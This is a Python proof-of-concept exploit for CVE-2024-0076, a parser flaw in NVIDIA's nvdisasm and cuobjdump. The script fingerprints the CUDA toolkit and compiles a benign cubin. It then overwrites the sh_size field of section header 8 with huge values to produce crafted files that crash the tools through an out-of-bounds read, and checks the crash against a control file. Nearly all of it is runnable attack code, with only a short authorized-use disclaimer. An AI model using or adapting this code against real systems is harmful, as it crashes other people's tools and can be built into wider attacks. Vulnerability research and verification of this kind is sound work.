"""CVE-2024-0076 PoC: out-of-bounds read in the cuobjdump/nvdisasm ELF section walk.

TRIGGER ORACLE
--------------
FIELD: sh_size of section header index 8
OFFSET: e_shoff + 8 * e_shentsize + 0x20      SIZE: 8
REQUIRED: 0x00000000FFFFFFFF or 0xFFFFFFFFFFFFFFF0
CHECK PRESENT: no
WHY IT FAILS: nvdisasm derives the element count of the section-8 entry walk from the
              attacker-supplied sh_size while sh_offset still points inside the file, so
              the walk dereferences file offsets past the heap buffer that holds the
              cubin image and the process dies with an access violation.

CHANGE VS PREVIOUS ATTEMPT
--------------------------
This build never creates an ELF section and never touches the section-name string table:
it compiles a real cubin with nvcc, patches only the sh_size field of the existing section
header at the empirically observed index 8, reads that field back as an oracle, and runs
BOTH nvdisasm and cuobjdump on every artifact so the mutated field is actually consumed by
the disassembler rather than only by the ELF dumper.

No GPU is required: the flaw lives entirely in the host userspace ELF parser, and the CUDA
driver probe below is a fingerprint convenience only.
"""

import ctypes
import hashlib
import json
import os
import platform
import re
import shutil
import struct
import subprocess
import sys
import time

OUT_DIR = os.path.dirname(os.path.abspath(__file__))

DISCLAIMER = (
    "===========================================================\n"
    "DISCLAIMER: This script is a Proof-of-Concept for CUDA\n"
    "vulnerability CVE-2024-0076. It is intended ONLY for authorized\n"
    "security research on systems you own or have permission to test.\n"
    "===========================================================")

EM_CUDA = 190
SHT_PROGBITS = 1
SHT_NOBITS = 8
SHDR_FMT = "<IIQQQQIIQQ"
SHDR_SIZE = 64
SH_SIZE_OFFSET = 32
TARGET_INDEX = 8
HUGE_SIZES = (0xFFFFFFFF, 0xFFFFFFFFFFFFFFF0)
RUN_TIMEOUT = 180
PTX_VERSIONS = {"sm_90": "8.0", "sm_89": "7.8", "sm_86": "7.1", "sm_80": "7.0"}
ARCH_FALLBACK = ("sm_75", "sm_86", "sm_80", "sm_61", "sm_52")


def log_start(step, desc):
    """Print the START marker for a verification step."""
    print("[CUDA_STEP:%s] %s \u2014 START" % (step, desc))
    sys.stdout.flush()


def log_ok(step, desc):
    """Print the OK marker for a verification step."""
    print("[CUDA_STEP:%s] %s \u2014 OK" % (step, desc))
    sys.stdout.flush()


def log_fail(step, desc, err):
    """Print the FAIL marker for a verification step with the error detail."""
    print("[CUDA_STEP:%s] %s \u2014 FAIL: %s" % (step, desc, err))
    sys.stdout.flush()


def run_cmd(argv, timeout=RUN_TIMEOUT):
    """Execute a command and return its exit status with captured stdout and stderr."""
    try:
        proc = subprocess.run(argv, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                              timeout=timeout)
    except FileNotFoundError:
        return {"argv": argv, "rc": None, "out": "", "err": "executable not found"}
    except subprocess.TimeoutExpired:
        return {"argv": argv, "rc": None, "out": "", "err": "timed out after %ds" % timeout}
    except OSError as exc:
        return {"argv": argv, "rc": None, "out": "", "err": str(exc)}
    return {"argv": argv, "rc": proc.returncode,
            "out": proc.stdout.decode("utf-8", "replace"),
            "err": proc.stderr.decode("utf-8", "replace")}


def report_failure(result, label, step):
    """Print the failing command line plus capped stdout and stderr."""
    print("[CUDA_STEP:%s] %s command: %s"
          % (step, label, " ".join(str(a) for a in result["argv"])))
    print("[CUDA_STEP:%s] %s stdout[:4000]: %s" % (step, label, result["out"][:4000]))
    print("[CUDA_STEP:%s] %s stderr[:4000]: %s" % (step, label, result["err"][:4000]))
    sys.stdout.flush()


def is_crash(rc):
    """Return True when an exit status denotes a fatal signal or Windows exception."""
    if rc is None:
        return False
    if rc < 0:
        return True
    return rc >= 0xC0000000


def attribute(name, result):
    """Report the signal or exception code that terminated a tool run."""
    rc = result["rc"]
    if is_crash(rc):
        if rc < 0:
            detail = "signal=%d" % (-rc)
        else:
            detail = "exception=0x%08X" % rc
        print("[CPG_ATTR] %s fault %s" % (name, detail))
    else:
        print("[CPG_ATTR] %s clean exit rc=%s" % (name, rc))
    lines = (result["err"] or result["out"]).strip().splitlines()
    if lines:
        print("[CPG_ATTR] %s output[0]=%s" % (name, lines[0][:200]))
    sys.stdout.flush()


def candidate_dirs():
    """Yield plausible CUDA toolkit bin directories for this host."""
    for var in ("CUDA_PATH", "CUDA_HOME", "CUDA_ROOT"):
        root = os.environ.get(var)
        if root:
            yield os.path.join(root, "bin")
    bases = [r"C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA"] if os.name == "nt" \
        else ["/usr/local"]
    for base in bases:
        if not os.path.isdir(base):
            continue
        for entry in sorted(os.listdir(base), reverse=True):
            path = os.path.join(base, entry, "bin")
            if os.path.isdir(path):
                yield path


def find_tool(name):
    """Locate a CUDA toolchain binary on PATH or inside the toolkit directories."""
    found = shutil.which(name)
    if found:
        return found
    for directory in candidate_dirs():
        for suffix in ("", ".exe", ".EXE"):
            path = os.path.join(directory, name + suffix)
            if os.path.isfile(path):
                return path
    return None


def sha256_file(path):
    """Return the SHA-256 digest of a file."""
    digest = hashlib.sha256()
    with open(path, "rb") as handle:
        for chunk in iter(lambda: handle.read(65536), b""):
            digest.update(chunk)
    return digest.hexdigest()


def tool_version(path):
    """Run --version on a CUDA tool and return its output plus parsed release tuple."""
    result = run_cmd([path, "--version"], timeout=60)
    text = result["out"] + result["err"]
    return {"result": result, "text": text, "version": parse_release(text)}


def parse_release(text):
    """Extract the release number from tool output without assuming a fixed format."""
    match = re.search(r"release\s+(\d+)\.(\d+)", text)
    if match:
        return (int(match.group(1)), int(match.group(2)), 0)
    match = re.search(r"(\d+)\.(\d+)\.?(\d+)?", text)
    if match:
        return (int(match.group(1)), int(match.group(2)), int(match.group(3) or 0))
    return None


def classify_toolkit(version):
    """Map a toolkit version to AFFECTED / PATCHED / UNKNOWN using the advisory table."""
    if version is None:
        return "UNKNOWN", "release not parsable - consult the advisory"
    major, minor = version[0], version[1]
    if major == 12:
        if minor <= 3:
            return "AFFECTED", "12.%d is below the advisory fix boundary 12.4" % minor
        return "PATCHED", "12.%d is at or above the advisory fix boundary 12.4" % minor
    if major in (10, 11):
        return "AFFECTED", "%d.x is below the advisory fix boundary 12.4" % major
    return "UNKNOWN", "branch %d is not in the known table - consult the advisory" % major


def probe_driver_api():
    """Load and initialise the CUDA driver library, then report version and device count."""
    names = ["nvcuda.dll"] if os.name == "nt" else ["libcuda.so.1", "libcuda.so"]
    for name in names:
        try:
            lib = ctypes.CDLL(name)
        except OSError as exc:
            print("[CUDA_STEP:S01] cannot load %s: %s" % (name, exc))
            continue
        rc = lib.cuInit(0)
        if rc != 0:
            print("[CUDA_STEP:S01] cuInit on %s returned %d" % (name, rc))
            continue
        version = ctypes.c_int(0)
        rc = lib.cuDriverGetVersion(ctypes.byref(version))
        if rc != 0:
            print("[CUDA_STEP:S01] cuDriverGetVersion returned %d" % rc)
            continue
        count = ctypes.c_int(0)
        rc = lib.cuDeviceGetCount(ctypes.byref(count))
        if rc != 0:
            print("[CUDA_STEP:S01] cuDeviceGetCount returned %d" % rc)
            continue
        print("[CUDA_STEP:S01] driver API %d.%d, device count %d"
              % (version.value // 1000, (version.value % 1000) // 10, count.value))
        return
    print("[CUDA_STEP:S01] CUDA driver API unavailable - this CVE needs no GPU")


def fingerprint_environment():
    """Detect host, GPU, driver and CUDA toolchain and classify the toolkit range."""
    log_start("S01", "fingerprint host, driver and CUDA toolchain")
    info = {"tools": {}, "os": platform.system(), "release": platform.version(),
            "machine": platform.machine(), "python": platform.python_version()}
    print("[CUDA_STEP:S01] host os=%s release=%s arch=%s python=%s"
          % (info["os"], info["release"], info["machine"], info["python"]))
    smi = run_cmd(["nvidia-smi", "--query-gpu=name,compute_cap,driver_version",
                   "--format=csv,noheader"], timeout=60)
    if smi["rc"] == 0:
        print("[CUDA_STEP:S01] nvidia-smi devices: %s"
              % smi["out"].strip().replace("\n", " | "))
        info["smi"] = smi["out"].strip()
    else:
        print("[CUDA_STEP:S01] nvidia-smi unavailable: %s" % smi["err"].strip()[:200])
    probe_driver_api()
    version = None
    for name in ("nvcc", "cuobjdump", "nvdisasm", "ptxas"):
        path = find_tool(name)
        info["tools"][name] = path
        if not path:
            print("[CUDA_STEP:S01] %s not found on PATH or in the toolkit directories" % name)
            continue
        print("[CUDA_STEP:S01] %s -> %s sha256=%s" % (name, path, sha256_file(path)))
        probe = tool_version(path)
        print("[CUDA_STEP:S01] %s --version full output:\n%s" % (name, probe["text"].strip()))
        print("[CUDA_STEP:S01] %s parsed release=%s" % (name, probe["version"]))
        if version is None and name in ("nvcc", "cuobjdump"):
            version = probe["version"]
    verdict, why = classify_toolkit(version)
    print("[CUDA_STEP:S01] toolkit %s classified %s (%s)" % (version, verdict, why))
    info["verdict"] = verdict
    log_ok("S01", "fingerprint host, driver and CUDA toolchain")
    return info


def detect_arch(nvcc):
    """Determine a compute capability to compile for, preferring the installed GPU."""
    smi = run_cmd(["nvidia-smi", "--query-gpu=compute_cap", "--format=csv,noheader"],
                  timeout=60)
    if smi["rc"] == 0:
        for line in smi["out"].splitlines():
            cap = line.strip()
            if re.match(r"^\d+\.\d+$", cap):
                return "sm_" + cap.replace(".", "")
    if nvcc:
        listing = run_cmd([nvcc, "--list-gpu-arch"], timeout=60)
        arches = re.findall(r"compute_(\d+)", listing["out"])
        if arches:
            return "sm_" + arches[-1]
    return "sm_52"


def write_ptx(path, arch):
    """Write a minimal PTX module that ptxas can assemble into a cubin."""
    version = PTX_VERSIONS.get(arch, "7.0")
    text = (".version %s\n.target %s\n.address_size 64\n\n"
            ".visible .entry cpg_kernel()\n{\n    ret;\n}\n" % (version, arch))
    with open(path, "w") as handle:
        handle.write(text)


def build_cubin(nvcc, ptxas, arch):
    """Compile a trivial kernel into a cubin using nvcc, falling back to ptxas."""
    cubin = os.path.join(OUT_DIR, "benign.cubin")
    source = os.path.join(OUT_DIR, "benign_kernel.cu")
    with open(source, "w") as handle:
        handle.write("__global__ void cpg_kernel(void) { }\n")
    candidates = [arch] + [a for a in ARCH_FALLBACK if a != arch]
    for candidate in candidates:
        if not nvcc:
            break
        result = run_cmd([nvcc, "-cubin", "-arch=" + candidate, "-o", cubin, source])
        if result["rc"] == 0 and os.path.isfile(cubin) and os.path.getsize(cubin) > 0:
            print("[CUDA_STEP:S02] nvcc -arch=%s produced %d bytes"
                  % (candidate, os.path.getsize(cubin)))
            return cubin
        report_failure(result, "nvcc -cubin -arch=" + candidate, "S02")
    for candidate in candidates:
        if not ptxas:
            break
        ptx = os.path.join(OUT_DIR, "benign_kernel.ptx")
        write_ptx(ptx, candidate)
        result = run_cmd([ptxas, "-arch=" + candidate, "-o", cubin, ptx])
        if result["rc"] == 0 and os.path.isfile(cubin) and os.path.getsize(cubin) > 0:
            print("[CUDA_STEP:S02] ptxas -arch=%s produced %d bytes"
                  % (candidate, os.path.getsize(cubin)))
            return cubin
        report_failure(result, "ptxas -arch=" + candidate, "S02")
    return None


def stage_baseline(nvcc, ptxas, arch, nvdisasm, cuobjdump):
    """Build the baseline cubin and confirm that both utilities accept it."""
    log_start("S02", "produce and validate a known-good baseline cubin")
    print("[CUDA_STEP:S02] compile architecture: %s" % arch)
    cubin = build_cubin(nvcc, ptxas, arch)
    if not cubin:
        log_fail("S02", "produce and validate a known-good baseline cubin",
                 "no compiler produced a cubin")
        return None
    probes = (("nvdisasm", [nvdisasm, cubin]), ("cuobjdump", [cuobjdump, "--dump-elf", cubin]))
    for label, argv in probes:
        result = run_cmd(argv)
        text = (result["out"] or result["err"]).strip()
        if result["rc"] != 0 or not text:
            report_failure(result, label + " on baseline", "S02")
            log_fail("S02", "produce and validate a known-good baseline cubin",
                     "%s rejected the baseline (rc=%s)" % (label, result["rc"]))
            return None
        print("[CUDA_STEP:S02] %s accepted the baseline, first line: %s"
              % (label, text.splitlines()[0][:160]))
    log_ok("S02", "produce and validate a known-good baseline cubin")
    return cubin


def parse_elf_header(data):
    """Decode the ELF64 little-endian header fields used by the section walk."""
    if len(data) < SHDR_SIZE or data[:4] != b"\x7fELF":
        return None
    if data[4] != 2 or data[5] != 1:
        return None
    fields = struct.unpack_from("<HHIQQQIHHHHHH", data, 16)
    return {"e_type": fields[0], "e_machine": fields[1], "e_version": fields[2],
            "e_entry": fields[3], "e_phoff": fields[4], "e_shoff": fields[5],
            "e_flags": fields[6], "e_ehsize": fields[7], "e_phentsize": fields[8],
            "e_phnum": fields[9], "e_shentsize": fields[10], "e_shnum": fields[11],
            "e_shstrndx": fields[12]}


def parse_section_headers(data, header):
    """Decode the section header table and stop at any header outside the file."""
    shoff = header["e_shoff"]
    entsize = header["e_shentsize"]
    count = header["e_shnum"]
    if shoff == 0 or entsize < SHDR_SIZE or shoff + SHDR_SIZE > len(data):
        return []
    if count == 0:
        count = struct.unpack_from(SHDR_FMT, data, shoff)[5]
    sections = []
    for index in range(count):
        offset = shoff + index * entsize
        if offset + SHDR_SIZE > len(data):
            break
        values = struct.unpack_from(SHDR_FMT, data, offset)
        sections.append({"index": index, "hdr_offset": offset, "sh_name": values[0],
                         "sh_type": values[1], "sh_flags": values[2], "sh_addr": values[3],
                         "sh_offset": values[4], "sh_size": values[5], "sh_link": values[6],
                         "sh_info": values[7], "sh_addralign": values[8],
                         "sh_entsize": values[9]})
    return sections


def load_layout(path):
    """Read a cubin, decode its ELF header and section table, and log the geometry."""
    log_start("S03", "enumerate ELF fields that encode an extent or an index")
    with open(path, "rb") as handle:
        data = handle.read()
    header = parse_elf_header(data)
    if header is None:
        log_fail("S03", "enumerate ELF fields that encode an extent or an index",
                 "not an ELF64 little-endian file")
        return None, []
    print("[CUDA_STEP:S03] e_machine=%d e_shoff=0x%x e_shentsize=%d e_shnum=%d e_shstrndx=%d"
          % (header["e_machine"], header["e_shoff"], header["e_shentsize"],
             header["e_shnum"], header["e_shstrndx"]))
    if header["e_machine"] != EM_CUDA:
        log_fail("S03", "enumerate ELF fields that encode an extent or an index",
                 "e_machine=%d is not EM_CUDA" % header["e_machine"])
        return None, []
    sections = parse_section_headers(data, header)
    outside = 0
    for section in sections:
        print("[CUDA_STEP:S03] section[%02d] type=0x%x off=0x%x size=0x%x entsize=0x%x"
              % (section["index"], section["sh_type"], section["sh_offset"],
                 section["sh_size"], section["sh_entsize"]))
        if section["sh_type"] != SHT_NOBITS and section["sh_offset"] + section["sh_size"] > len(data):
            outside += 1
    print("[CUDA_STEP:S03] file size=%d, baseline sections outside the file=%d"
          % (len(data), outside))
    log_ok("S03", "enumerate ELF fields that encode an extent or an index")
    return header, sections


def select_target(sections):
    """Pick the section header whose sh_size will be mutated and explain the choice."""
    if len(sections) > TARGET_INDEX:
        return sections[TARGET_INDEX], "empirically observed trigger index %d" % TARGET_INDEX
    for section in sections:
        if section["index"] > 0 and section["sh_type"] == SHT_PROGBITS:
            return section, "fallback PROGBITS entry, table shorter than %d" % TARGET_INDEX
    return None, "no usable section header in the table"


def patch_section_size(source, destination, section, value):
    """Write one sh_size field into a copy of the template, leaving all other bytes intact."""
    with open(source, "rb") as handle:
        data = bytearray(handle.read())
    struct.pack_into("<Q", data, section["hdr_offset"] + SH_SIZE_OFFSET,
                     value & 0xFFFFFFFFFFFFFFFF)
    with open(destination, "wb") as handle:
        handle.write(data)
    return section["hdr_offset"] + SH_SIZE_OFFSET


def read_back(path, field_offset):
    """Read a little-endian 64-bit value back from a file at the given offset."""
    with open(path, "rb") as handle:
        handle.seek(field_offset)
        return struct.unpack("<Q", handle.read(8))[0]


def count_diff(path_a, path_b):
    """Count the bytes that differ between two files of equal length."""
    with open(path_a, "rb") as handle_a:
        data_a = handle_a.read()
    with open(path_b, "rb") as handle_b:
        data_b = handle_b.read()
    if len(data_a) != len(data_b):
        return abs(len(data_a) - len(data_b))
    return sum(1 for left, right in zip(data_a, data_b) if left != right)


def oracle(field, actual, expected):
    """Print the read-back value of the mutated field next to the required value."""
    ok = actual == expected
    print("[CPG_ORACLE] %s actual=0x%016x expected=0x%016x ok=%s"
          % (field, actual, expected, ok))
    sys.stdout.flush()
    return ok


def craft_artifacts(baseline, target):
    """Write each crafted variant plus the restored-size control into the output directory."""
    log_start("S04", "mutate the section extent field and build the restored control")
    field = target["hdr_offset"] + SH_SIZE_OFFSET
    print("[CUDA_STEP:S04] target section index %d type=0x%x sh_offset=0x%x sh_size=0x%x"
          % (target["index"], target["sh_type"], target["sh_offset"], target["sh_size"]))
    print("[CUDA_STEP:S04] sh_size field file offset 0x%x" % field)
    crafted = []
    for value in HUGE_SIZES:
        name = "poc_sec%02d_shsize_%016x.cubin" % (target["index"], value)
        path = os.path.join(OUT_DIR, name)
        patch_section_size(baseline, path, target, value)
        oracle("section[%d].sh_size" % target["index"], read_back(path, field), value)
        print("[CUDA_STEP:S04] wrote %s (%d bytes, %d byte(s) differ from baseline)"
              % (name, os.path.getsize(path), count_diff(baseline, path)))
        crafted.append(name)
    control = "ctrl_sec%02d_shsize_restored_%016x.cubin" % (target["index"],
                                                            target["sh_size"])
    control_path = os.path.join(OUT_DIR, control)
    patch_section_size(baseline, control_path, target, target["sh_size"])
    oracle("section[%d].sh_size" % target["index"], read_back(control_path, field),
           target["sh_size"])
    print("[CUDA_STEP:S04] wrote %s (%d bytes, %d byte(s) differ from baseline)"
          % (control, os.path.getsize(control_path), count_diff(baseline, control_path)))
    log_ok("S04", "mutate the section extent field and build the restored control")
    return crafted, control


def write_manifest(benign, crafted, control):
    """Write artifacts.json describing the role of every generated file."""
    manifest = {"benign": [benign], "crafted": list(crafted), "controls": [control]}
    path = os.path.join(OUT_DIR, "artifacts.json")
    with open(path, "w") as handle:
        json.dump(manifest, handle, indent=2)
    print("[INFO] manifest written to %s: %s" % (path, json.dumps(manifest)))


def rendezvous():
    """Pause for a debugger attach when the harness requests an observation window."""
    pause = os.environ.get("CPG_DEBUG_PAUSE")
    if not pause:
        return
    try:
        seconds = float(pause)
    except ValueError:
        seconds = 0.0
    print("[CPG_READY] %d" % os.getpid())
    sys.stdout.flush()
    if seconds > 0:
        time.sleep(seconds)


def run_artifact(name, path, role, nvdisasm, cuobjdump):
    """Run both binary utilities twice on one artifact and report every exit status."""
    print("[CPG_LABEL] %s %s" % (name, role))
    sys.stdout.flush()
    primary = []
    for _ in range(2):
        result = run_cmd([nvdisasm, path])
        primary.append(result)
        print("[CPG_RUN] %s exit=%s" % (name, result["rc"]))
        sys.stdout.flush()
        secondary = run_cmd([cuobjdump, "--dump-elf", path])
        print("[CPG_RUN] %s exit=%s tool=cuobjdump" % (name, secondary["rc"]))
        sys.stdout.flush()
        if (result["out"] or result["err"]).strip():
            first = (result["out"] or result["err"]).strip().splitlines()[0]
            print("[CPG_ATTR] %s nvdisasm output[0]=%s" % (name, first[:200]))
    return primary


def execute_all(nvdisasm, cuobjdump, plan):
    """Run both utilities over every artifact and return 0 when the differential holds."""
    log_start("S10", "replay every artifact under nvdisasm and cuobjdump")
    crashes = {}
    for name, role in plan:
        results = run_artifact(name, os.path.join(OUT_DIR, name), role, nvdisasm, cuobjdump)
        attribute(name, results[0])
        crashes[name] = any(is_crash(item["rc"]) for item in results)
    log_ok("S10", "replay every artifact under nvdisasm and cuobjdump")
    crafted_hit = any(crashes[n] for n, r in plan if r == "MALICIOUS")
    control_clean = all(not crashes[n] for n, r in plan if r == "CONTROL")
    baseline_clean = all(not crashes[n] for n, r in plan if r == "BENIGN")
    print("[CUDA_STEP:S12] differential crafted_fault=%s control_clean=%s baseline_clean=%s"
          % (crafted_hit, control_clean, baseline_clean))
    if crafted_hit and control_clean and baseline_clean:
        print("[CUDA_STEP:S12] package results and verdict \u2014 OK")
        return 0
    print("[CUDA_STEP:S12] package results and verdict \u2014 FAIL: no attributable "
          "differential, the crafted section extent was not observed to fault")
    return 1


def main():
    """Drive environment fingerprint, baseline build, mutation, execution and verdict."""
    print(DISCLAIMER)
    print("[INFO] output directory: %s" % OUT_DIR)
    env = fingerprint_environment()
    nvdisasm = env["tools"].get("nvdisasm")
    cuobjdump = env["tools"].get("cuobjdump")
    if not nvdisasm or not cuobjdump:
        log_fail("S01", "fingerprint host, driver and CUDA toolchain",
                 "nvdisasm and cuobjdump are both required, one is missing")
        return 2
    arch = detect_arch(env["tools"].get("nvcc"))
    baseline = stage_baseline(env["tools"].get("nvcc"), env["tools"].get("ptxas"), arch,
                              nvdisasm, cuobjdump)
    if not baseline:
        return 2
    header, sections = load_layout(baseline)
    if not sections:
        return 2
    target, reason = select_target(sections)
    if target is None:
        log_fail("S03", "select target section header", reason)
        return 2
    print("[CUDA_STEP:S03] target selection: %s" % reason)
    crafted, control = craft_artifacts(baseline, target)
    benign_name = os.path.basename(baseline)
    write_manifest(benign_name, crafted, control)
    rendezvous()
    plan = [(benign_name, "BENIGN")]
    plan.extend((name, "MALICIOUS") for name in crafted)
    plan.append((control, "CONTROL"))
    return execute_all(nvdisasm, cuobjdump, plan)


if __name__ == "__main__":
    sys.exit(main())
